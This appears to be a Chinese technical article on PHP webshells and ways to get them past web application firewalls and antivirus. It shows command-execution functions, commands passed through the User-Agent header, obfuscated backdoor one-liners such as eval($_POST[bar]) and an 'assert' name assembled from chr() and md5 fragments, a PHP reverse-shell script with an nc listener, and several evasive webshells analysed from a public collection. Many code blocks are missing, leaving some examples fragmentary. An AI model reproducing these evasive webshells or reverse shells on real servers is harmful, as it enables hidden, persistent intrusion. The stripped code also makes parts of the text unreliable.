# 【技术分享】php webshell分析和绕过waf技巧
|
##### 译文声明
本文是翻译文章，文章来源：安全客
译文仅供参考，具体内容表达以及含义原文为准。
作者：[阻圣](http://bobao.360.cn/member/contribute?uid=134615136)
预估稿费：400RMB（不服你也来投稿啊！）
投稿方式：发送邮件至[linwei#360.cn](mailto:PI:EMAIL)，或登陆[网页版](http://bobao.360.cn/contribute/index)在线投稿
**前言**
WebShell是攻击者使用的恶意脚本，它的用途主要是在攻击后的Web应用程序上建立持久性的后门。webshell本身不能攻击或者利用远程漏洞，所以说它总是攻击的第二阶段，这个阶段我们经常称为post-exploitation。（PS：Post Exploitation是国外渗透测试标准里面的一个阶段）
**WebShell常用函数**
现在的Web应用程序基本上是采用PHP开发的，所以本篇文章也主要介绍的是php环境下的WebShell。WebShell无非就是使用PHP内置的函数来执行命令，以下就是用于在php中执行shell命令的一些最常用的函数。
**system()**
system()函数接收命令作为参数，并输出结果。
以下示例演示了运行dir命令，显示执行php文件目录的目录列表：
    -->
     驱动器 C 中的卷没有标签。 卷的序列号是 7C53-7529 C:phpstudyWWW 的目录 2016-12-02 15:39 
        . 2016-12-02 15:39 
        .. 2016-12-02 15:38 56 hello.php 2016-12-02 15:38 29 system.php 2016-12-02 15:39 
        test 2 个文件 85 字节 3 个目录 871,600,128 可用字节
**exec()**
exec()函数接收一个命令作为参数，当不输出结果，如果指定第二个可选参数，则结果将作为数组返回。否则，如果回显，将只显示结果的最后一行。
    -->
我们可以使用echo来输出exec()函数的结果。可以发现只有结果的最后一行。
    -->
    3 个目录 871,538,688 可用字节
如果指定第二个参数，则在数组中返回结果。
    -->
    3 个目录 871,538,688 可用字节Array ( [0] => 驱动器 C 中的卷没有标签。 [1] => 卷的序列号是 7C53-7529 [2] => [3] => C:phpstudyWWW 的目录 [4] => [5] => 2016-12-02 15:52 
    . [6] => 2016-12-02 15:52 
    .. [7] => 2016-12-02 16:15 53 exec.php [8] => 2016-12-02 15:38 56 hello.php [9] => 2016-12-02 15:46 25 system.php [10] => 2016-12-02 15:39 
    test [11] => 3 个文件 134 字节 [12] => 3 个目录 871,538,688 可用字节 )
**shell_exec()**
shell_exec()函数类似于exec()函数，但不同的是，它会将整个结果作为字符串输出。
    -->
    驱动器 C 中的卷没有标签。 卷的序列号是 7C53-7529 C:phpstudyWWW 的目录 2016-12-02 16:26 
    . 2016-12-02 16:26 
    .. 2016-12-02 16:15 53 exec.php 2016-12-02 15:38 56 hello.php 2016-12-02 16:27 34 shellexec.php 2016-12-02 15:46 25 system.php 2016-12-02 15:39 
    test 4 个文件 168 字节 3 个目录 871,460,864 可用字节
**passthru()**
passthru()函数执行命令并返回输出。
    -->
    驱动器 C 中的卷没有标签。 卷的序列号是 7C53-7529 C:phpstudyWWW 的目录 2016-12-02 16:35 
    . 2016-12-02 16:35 
    .. 2016-12-02 16:15 53 exec.php 2016-12-02 15:38 56 hello.php 2016-12-02 16:35 27 passthru.php 2016-12-02 16:27 34 shellexec.php 2016-12-02 15:46 25 system.php 2016-12-02 15:39 
    test 5 个文件 195 字节 3 个目录 871,456,768 可用字节
**proc_open()**
proc_open()函数执行一个命令，并且打开用来输入/输出的文件指针。
这个函数可能很难理解，简单的来说，通过使用proc_open()函数，我们可以创建一个进程用于我们的脚本和我们想要运行程序之间的通信。详见PHP文档：
**  
**
**preg_replace()与/e修饰符**
preg_replace()函数可以执行正则表达式的搜索和替换
如果使用/e修饰符，意味着使用eval执行替换，这样我们就可以传递一个要由eval()函数执行的代码
    -->
    \ 的用户帐户 ------------------------------------------------------------------------------- Administrator ASPNET Guest HelpAssistant SUPPORT_388945a0 命令运行完毕，但发生一个或多个错误。
**反引号**
肯定很多人没有注意到这点吧，php将反引号的内容作为shell命令执行。
    $string";
    ?>
结果：
某WAF也没扫描到：
**  
**
**隐藏WebShell-免杀之路**
**利用HTTP请求头**
在php中，我们可以很容易获取到HTTP请求头里面的某些特殊字符串头，比如User-Agent。同样的原理，我也可以利用这个来传入需要执行的命令。
通过User-Agent传入命令执行：
某waf也是扫描到，当然除了User-Agent，我们还有Accept-Language等特殊字符串头，这里就不做演示了，主要的还是方法。
**混淆技术**
上面的方法虽然过了waf，但是我们人工一看就知道有问题，所以我们还需要一些混淆技术来隐藏webshell。首先我们来认识一下几个常用功能。
eval() :把字符串作为PHP代码执行
assert() :判断一个表达式是否成立，直接传入字符串会当做 PHP 代码来执行
base64() :使用base64对数据进行编码
gzdeflate() :对数据进行Deflate压缩，gzinflate()解压缩
str_rot13() :对字符串执行 ROT13 转换
**回调函数**
这种办法国内我是看了phithon的介绍，不过这里我肯定要介绍是最新能绕waf的函数。
    create_function()
这样构造可以把前面的函数体闭合，再把后面的注释掉，这样就相当于执行了。
    eval($_POST[bar])
使用system函数执行net user命令：
**反弹shell**
这里给大家介绍一个php反弹shell的脚本。
下载地址：
使用方法：
第一步，填写需要反弹到的IP地址和端口以及需要执行的shell命令。
    $ip = '127.0.0.1';  // IP地址
    $port = 1234;       // 端口
    $shell = 'net user'; //需要执行的命令
然后我使用nc监听端口1234：
    nc -v -n -l -p 1234
访问php文件后，查看nc监听结果，发现命令成功执行，结果反弹。
waf没有扫描到。
**那些年强悍的WebShell分析**
在Github上有个项目收集了很多的WebShell，这里我们拿出几个我认为比较强悍的webshell分析一下。
项目地址：
**利用404页面隐藏PHP木马**
webshell/php/404.php
这里主要的代码如下：
    eval(gzinflate(base64_decode($code)));
木马代码被编码压缩在$code变量中，验证密码是否正确，正确就解压执行，这里密码经过了三次md5加密。
**过某waf的webshell**
webshell/php/bypass-safedog-2016-08-29.php
        ';
        $poc=substr($a,14,1).chr(115).chr(115).substr($a,22,1).chr(114).chr(116);
        $poc($_GET['a']);
        ?>
利用a的md5值取出了a和e，配合chr函数，构造出assert。
利用演示：
**zone_hackbar.php**
webshell/php/zone_hackbar.php
这个webshell也是通过隐藏关键字，$s21就是base64解密函数，$s22就是接收POST数据。不过某waf对eval可是很敏感的，直接报警。
不要紧，我们修改一下就可以了，用assert，不需要base64加密了。
这次就没有扫描到了，看看使用有没有错。
**过各大杀软的pHp一句话**
webshell/php/过各大杀软的pHp一句话.php
看起来没什么，其实就是先构造了chr这个字符串，然后利用chr函数分别构造了eval($_POST[1]);和create_function。
最后就是执行：
    create_function("",eval($_POST[1]););
不过现在某waf对chr可是很敏感滴。立马被拦截了。
**最新过某waf一句话** ****
这个是我在互联网上看见的，其实和回调函数差不多，拿来分析一下吧。
先是构造了一个函数yuag_array,然后传入了两个参数，经过反转和替换字符串构造出assert。
这样最后执行的就是：
    array_map(assert,array($_POST['yuag']));
这里就不再做详细介绍了。
**参考文章**